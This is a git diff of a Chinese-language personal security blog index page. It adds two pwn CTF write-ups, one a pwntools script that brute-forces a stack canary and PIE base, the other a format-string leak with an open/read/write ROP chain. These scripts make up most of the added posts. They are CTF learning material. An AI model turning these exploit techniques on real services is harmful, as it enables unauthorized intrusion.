@@ -128,7 +128,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">52</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">53</span></a>
 
   </li>
   </ul>
@@ -154,6 +154,164 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/28/%E7%88%86%E7%A0%B4canary-pie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/28/%E7%88%86%E7%A0%B4canary-pie/" class="post-title-link" itemprop="url">爆破canary,pie</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-28 17:36:05" itemprop="dateCreated datePublished" datetime="2023-05-28T17:36:05+08:00">2023-05-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-12 20:07:10" itemprop="dateModified" datetime="2023-07-12T20:07:10+08:00">2023-07-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Checksec检查附件,64位,保护全开</p>
+<p> <img src="/../images/%E7%88%86%E7%A0%B4canary-pie/image-20230528173718070.png" alt="image-20230528173718070">        </p>
+<p>Ida打开分析源码</p>
+<p> <img src="/../images/%E7%88%86%E7%A0%B4canary-pie/image-20230528173728742.png" alt="image-20230528173728742"></p>
+<p>Fork()循环创建子进程执行sub_12BA函数</p>
+<p> <img src="/../images/%E7%88%86%E7%A0%B4canary-pie/image-20230528173737280.png" alt="image-20230528173737280"></p>
+<p>read(0, buf, 0x80uLL)存在栈溢出漏洞</p>
+<p>发现后门函数</p>
+<p> <img src="/../images/%E7%88%86%E7%A0%B4canary-pie/image-20230528173746355.png" alt="image-20230528173746355"></p>
+<p>思路已经很清晰了:</p>
+<p>循环爆破canary的值,再爆破pie基址.覆盖返回地址为后门函数,脚本如下:</p>
+<p>Exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;123.56.99.60&#x27;,21678)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span>+<span class="built_in">str</span>(canary))</span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+canary+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x28&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	i=<span class="number">2</span>+k*<span class="number">16</span></span><br><span class="line">	p.send(pay+ i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">	a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行得到flag</p>
+<p> <img src="/../images/%E7%88%86%E7%A0%B4canary-pie/image-20230528173757163.png" alt="image-20230528173757163"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/26/ORW/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/26/ORW/" class="post-title-link" itemprop="url">ORW</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-26 13:11:08 / 修改时间：13:11:32" itemprop="dateCreated datePublished" datetime="2023-05-26T13:11:08+08:00">2023-05-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;59.110.164.72&quot;</span>,<span class="number">10066</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn2&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./Trapped&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">shell=<span class="number">0x400E88</span></span><br><span class="line">vuln=<span class="number">0x804847B</span></span><br><span class="line">bss=<span class="number">0x601080</span>+<span class="number">0x90</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400a23</span></span><br><span class="line">leave_ret=<span class="number">0x00000000004007c5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;This is a larger box\n&quot;</span>)</span><br><span class="line">pay=<span class="string">b&#x27;%15$p%9$p%10$p&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line"></span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment"># 0x000000000002601f : pop rsi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line"><span class="comment"># 0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">can=<span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(can))</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span>+<span class="number">48</span>+<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;This is a larger box\n&quot;</span>)</span><br><span class="line">pay=<span class="string">b&#x27;%9$p&#x27;</span></span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(<span class="string">&quot;We have a lot to talk about\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)+p64(can)+p64(stack+<span class="number">0x10</span>-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">payload += <span class="string">b&quot;/flag\x00\x00\x00&quot;</span> <span class="comment"># </span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x601060</span>+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x601060</span>+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(write_addr)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -348,10 +506,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-05-11 16:35:32 / 修改时间：16:35:58" itemprop="dateCreated datePublished" datetime="2023-05-11T16:35:32+08:00">2023-05-11</time>
+              <time title="创建时间：2023-05-11 16:35:32" itemprop="dateCreated datePublished" datetime="2023-05-11T16:35:32+08:00">2023-05-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-05 17:27:37" itemprop="dateModified" datetime="2023-10-05T17:27:37+08:00">2023-10-05</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -377,16 +541,16 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Downloads/</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>对光盘进行挂载（f1fc23f5c743425d9e0073887c846d23是附件名）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount f1fc23f5c743425d9e0073887c846d23  /mnt</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount f1fc23f5c743425d9e0073887c846d23  /mnt</span><br></pre></td></tr></table></figure>
 
 <p>再进入到mnt中</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /mnt/</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /mnt/</span><br></pre></td></tr></table></figure>
 
 <p>使用命令寻找flag文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find |grep <span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find |grep <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>会看到一个flag.txt的文件<br><img src="/../images/ext3/20200426214719396.png" alt="在这里插入图片描述"><br>使用cat命令输出flag.txt中的内容</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /mnt/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>
 
 <p>会得到一串密文<br><img src="/../images/ext3/20200426214951205.png" alt="在这里插入图片描述"><br>可以发现这个密文经过了base64加密，对其进行<a target="_blank" rel="noopener" href="https://tool.lu/encdec/">base64解密</a><br>即可。<br><img src="/../images/ext3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2OTI3MTUw,size_16,color_FFFFFF,t_70-16837941508361.png" alt="在这里插入图片描述"><br>得到flag：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure>
@@ -1035,205 +1199,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/09/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/09/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">Windows小技巧</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-09 15:43:40 / 修改时间：16:06:14" itemprop="dateCreated datePublished" datetime="2023-05-09T15:43:40+08:00">2023-05-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/others/" itemprop="url" rel="index"><span itemprop="name">others</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="更改特定类型文件的默认打开方式"><a href="#更改特定类型文件的默认打开方式" class="headerlink" title="更改特定类型文件的默认打开方式"></a>更改特定类型文件的默认打开方式</h1><p> 电脑上的文件类型种类繁多，我们需要用不同的程序打开不同的文件，我们可以自己进行设置，对不同的文件采用不同的打开方式，那么应该怎么设置呢？</p>
-<h2 id="方法-x2F-步骤"><a href="#方法-x2F-步骤" class="headerlink" title="方法&#x2F;步骤"></a>方法&#x2F;步骤</h2><p>1. </p>
-<p>   首先在开始按钮上点击右键，打开控制面板。</p>
-<p>   <img src="/../images/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/c99358fe474ec2839487ea5cbe4f50b8b53e1c8c.jpg" alt="怎么更改特定类型文件的默认打开方式？"></p>
-<p>2. </p>
-<p>   在小图标模式下，选择列表中的“默认程序”选项。</p>
-<p>   <img src="/../images/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/a99a494afa32939c9ccf0e015719ce2c5a1b158c.jpg" alt="怎么更改特定类型文件的默认打开方式？"></p>
-<p>3. </p>
-<p>   在默认程序窗口，选择 “将文件类型或协议与某个程序关联”。</p>
-<p>   <img src="/../images/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/1f9feadca039131f77d4026ae275f2c4ed990a8c.jpg" alt="怎么更改特定类型文件的默认打开方式？"></p>
-<p>4. </p>
-<p>   在这里可以看到当前机器识别的所有扩展名以及它们当前的打开方式。</p>
-<p>   <img src="/../images/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/d2987775f2c4ec99e77bd5b2c3fe1e425c6b078c.jpg" alt="怎么更改特定类型文件的默认打开方式？"></p>
-<p>5. </p>
-<p>   选择某个后缀类型，点击 “更改程序”，就可以更改它的默认打开程序。</p>
-<p>   <img src="/../images/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/1f03436b04d149295fb0e8a063e5eceeacbc7e8c.jpg" alt="怎么更改特定类型文件的默认打开方式？"></p>
-<p>6. </p>
-<p>   如果推荐列表里没有，我们点击 “更多选项”，可以选择电脑上已经安装的程序。</p>
-<p>   <img src="/../images/Windows%E5%B0%8F%E6%8A%80%E5%B7%A7/3852f6e5eceeadbc741796c3cd18dfdae53b7b8c.jpg" alt="怎么更改特定类型文件的默认打开方式？"></p>
-<h1 id="Windows删除或添加右击新建中的选项"><a href="#Windows删除或添加右击新建中的选项" class="headerlink" title="Windows删除或添加右击新建中的选项"></a>Windows删除或添加右击新建中的选项</h1><p>Windows下，在空白处，鼠标右键新建默认有文本文档、Word等。但是有一些东西我们平时非常少用甚至基本没用，而我们平时经常用的它却没有。所以今天查了些资料，总结了一下如何删除或添加鼠标右键新建中的选项。</p>
-<p>删除<br>比如，我现在要删除新建BMP图片文件这个选项，那我就要：</p>
-<p>首先使用Win+R键，调出运行框，输入regedit，调出注册表编辑器。</p>
-<p>找到HKEY_CLASSES_ROOT项，该项下有一大群.xx项，这些记录不同类型的文件扩展名，若存在子项ShellNew，则可以通过右键新建直接创建，也就是我们鼠标右击新建中的项。</p>
-<p>为了避免查找麻烦，可以直接在搜索栏输入输入计算机\HKEY_CLASSES_ROOT.bmp，然后回车。</p>
-<p>直接删除ShellNew这个子项</p>
-<p>然后新建BMP图片文件这个选项就鼠标右击新建里消失了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/28/gdb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/28/gdb/" class="post-title-link" itemprop="url">gdb</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-28 20:48:35" itemprop="dateCreated datePublished" datetime="2023-03-28T20:48:35+08:00">2023-03-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-09 15:33:13" itemprop="dateModified" datetime="2023-05-09T15:33:13+08:00">2023-05-09</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="攻防世界xctf-reverse：no-strings-attached"><a href="#攻防世界xctf-reverse：no-strings-attached" class="headerlink" title="攻防世界xctf reverse：no-strings-attached"></a>攻防世界xctf reverse：no-strings-attached</h1><p>拽入IDA中，shift F12未发现有价值信息，F5</p>
-<p><img src="/../images/gdb/20201124111918382.PNG" alt="img"></p>
-<p>经过查看，authenticate()为重要函数，通过下面代码分析，S2即为我们需要的flag</p>
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70.png" alt="img"></p>
-<p>s2是由decrypt()函数产生的，来看一下decrypt()函数</p>
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-16800080187684.png" alt="img"></p>
-<p>查看汇编代码，decrypt的返回值在eax中</p>
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-16800080383316.png" alt="img"></p>
-<p>gdb动态调试，在decrypt()函数结尾处下断点，随后读取eax中的值，获取s2</p>
-<p>查看.text段的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -t -j .text filename</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-16800081374698.png" alt="img"></p>
-<p>使用disass decrypt 查看汇编代码</p>
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-168000815365210.png" alt="img"></p>
-<p>我们把断点，下在decrypt()函数的最后一条指令上</p>
-<p>使用“i b”命令，查看断点信息</p>
-<p><img src="/../images/gdb/20201124150835209.PNG" alt="img"></p>
-<p>r，运行到断点</p>
-<p>n，单步执行，到decrypt()函数结束的下一行</p>
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-168000818121113.png" alt="img"></p>
-<p>i r，查看寄存器的值</p>
-<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-168000819674615.png" alt="img"></p>
-<p>查看eax的值：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/6sw $eax</span><br></pre></td></tr></table></figure>
-
-<p>6：显示6行数据</p>
-<p>s：字符串形式</p>
-<p>w：word（4字节）形式</p>
-<p><img src="/../images/gdb/20201124151547501-168000826751320.PNG" alt="img"></p>
-<p>flag get</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1305,7 +1270,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
